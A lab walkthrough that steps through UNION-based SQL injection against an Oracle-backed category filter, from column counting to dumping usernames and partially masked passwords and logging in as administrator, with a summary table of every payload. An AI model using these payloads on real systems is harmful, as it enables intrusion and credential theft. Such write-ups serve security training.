# 🛠️ SQL Injection Walkthrough: Listing Database Contents on Oracle  
## 🔍 Step-by-Step Guide to Solving the Lab  

## 🎯 Objective

**To exploit a SQL injection vulnerability in the product category filter and extract usernames and passwords from an Oracle database — ultimately logging in as the administrator.**

This lab simulates a real-world scenario where:
- The backend uses **Oracle Database**.
- You can view query results directly in the application response.
- There's a hidden table containing login credentials.

## 🧪 Lab Overview

You're targeting a vulnerable URL parameter:

```
GET /filter?category=<INJECT_HERE>
```

The application displays query results — making it ideal for **UNION-based SQL injection attacks**.

## 🧭 Step-by-Step Walkthrough

### 🔹 Step 1: Confirm SQL Injection Vulnerability

Start by testing if the input is injectable.

```http
GET /filter?category='
```

✅ If it breaks the query or shows an error → SQL injection point exists.

### 🔹 Step 2: Determine Number of Columns Using `ORDER BY`

Try using `ORDER BY` to guess how many columns are returned.

```http
GET /filter?category='+ORDER+BY+1-- 
GET /filter?category='+ORDER+BY+2-- 
GET /filter?category='+ORDER+BY+3-- 
```

✅ Confirmed: There are **2 columns**, since `ORDER BY 3` causes an error.

### 🔹 Step 3: Use `UNION SELECT` to Inject Data

Now try injecting data using `UNION SELECT`.

```http
GET /filter?category='+UNION+SELECT+NULL,NULL-- 
```

❌ Fails → Likely because Oracle requires all `SELECT` statements to include a `FROM` clause.

So, try Oracle-specific syntax using the built-in dummy table `DUAL`:

```http
GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+DUAL-- 
```

✅ Works → Confirmed backend is **Oracle**.

### 🔹 Step 4: Find Which Column Displays Text

Test which of the two columns displays text:

```http
GET /filter?category='+UNION+SELECT+'a',NULL+FROM+DUAL--   → ✅ Output shown  
GET /filter?category='+UNION+SELECT+NULL,'b'+FROM+DUAL--   → ✅ Output shown  
```

✅ Confirmed: Both the **column** is visible.

So, all useful injected data must be placed in the any column but i select **second column**.

### 🔹 Step 5: Retrieve Database Version

Use Oracle’s built-in `v$version` view to get version info:

```http
GET /filter?category='+UNION+SELECT+NULL,banner+FROM+v$version-- 
```

✅ Output:
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```

→ Confirmed running **Oracle 11g**.

### 🔹 Step 6: List All Tables in the Database

Now that we know it's Oracle, use system views like `all_tables`:

```http
GET /filter?category='+UNION+SELECT+NULL,TABLE_NAME+FROM+all_tables-- 
```

✅ Returns list of tables including:
- `APP_USERS_AND_ROLES`
- `USERS_MTWTMO`

Both look promising — investigate both.

### 🔹 Step 7: Enumerate Columns in Potential User Tables

#### For `APP_USERS_AND_ROLES`:
```http
GET /filter?category='+UNION+SELECT+NULL,COLUMN_NAME+FROM+all_tab_columns+WHERE+table_name='APP_USERS_AND_ROLES'-- 
```

Returns:
- `GUID`
- `ISROLE`
- `NAME`

Not helpful for login — move on.

#### For `USERS_MTWTMO`:
```http
GET /filter?category='+UNION+SELECT+NULL,COLUMN_NAME+FROM+all_tab_columns+WHERE+table_name='USERS_MTWTMO'-- 
```

Returns:
- `USERNAME_ECFLEX`
- `PASSWORD_AXFBYV`
- `EMAIL`

Looks like a valid user table with credentials.

### 🔹 Step 8: Extract Username & Password Fields

Since only one column is visible, concatenate both fields together using Oracle’s `||` operator.

Use a separator like `~` to distinguish between values:

```http
GET /filter?category='+UNION+SELECT+NULL,USERNAME_ECFLEX||'~'||PASSWORD_AXFBYV+FROM+USERS_MTWTMO-- 
```

✅ Output:
```
administrator~uevppxxxxxxxxx
carlos~16ks0f63xxxxxpxxxxxxxxx
wiener~kxb9xxxxxxxxxxxxxxxx
```

### 🔹 Step 9: Log In as Administrator

With the credentials extracted:

- **Username:** `administrator`  
- **Password:** `uevppxxxxxxxxxxxxxx`

Go to the login page and log in as the administrator → ✅ Lab solved!

## 📋 Summary of Payloads Used

| Goal | Payload |
|------|---------|
| Confirm vuln | `'` |
| Check column count | `' ORDER BY 1--` through `' ORDER BY 3--` |
| UNION select test (Oracle) | `' UNION SELECT NULL,NULL FROM DUAL--` |
| Identify visible column | `' UNION SELECT NULL,'a' FROM DUAL--` |
| Get DB version | `' UNION SELECT NULL,banner FROM v$version--` |
| List all tables | `' UNION SELECT NULL,TABLE_NAME FROM all_tables--` |
| Get columns of users table | `' UNION SELECT NULL,COLUMN_NAME FROM all_tab_columns WHERE table_name='USERS_MTWTMO'--` |
| Extract username + password | `' UNION SELECT NULL,USERNAME_ECFLEX||'~'||PASSWORD_AXFBYV FROM USERS_MTWTMO--` |

## 🧠 Key Oracle-Specific Notes

| Feature | Oracle Behavior |
|--------|------------------|
| Requires `FROM` clause | Every `SELECT` must include a `FROM` statement |
| Dummy table | Use `DUAL` as placeholder |
| String concatenation | Use `||` operator |
| System metadata views | Use `all_tables`, `all_tab_columns`, `v$version` |
| Case-sensitive identifiers | Table/column names may be uppercase-only in system views |


## ✅ Final Tip

Oracle has strict SQL syntax rules. Always remember:
> Every `SELECT` needs a `FROM`, even when you're not selecting real data.

And always adapt your payloads based on:
- What the app displays
- How many columns exist
- Which DBMS is running
- Whether comments or keywords are filtered

Happy hacking! 🔥🕵️‍♂️🛡️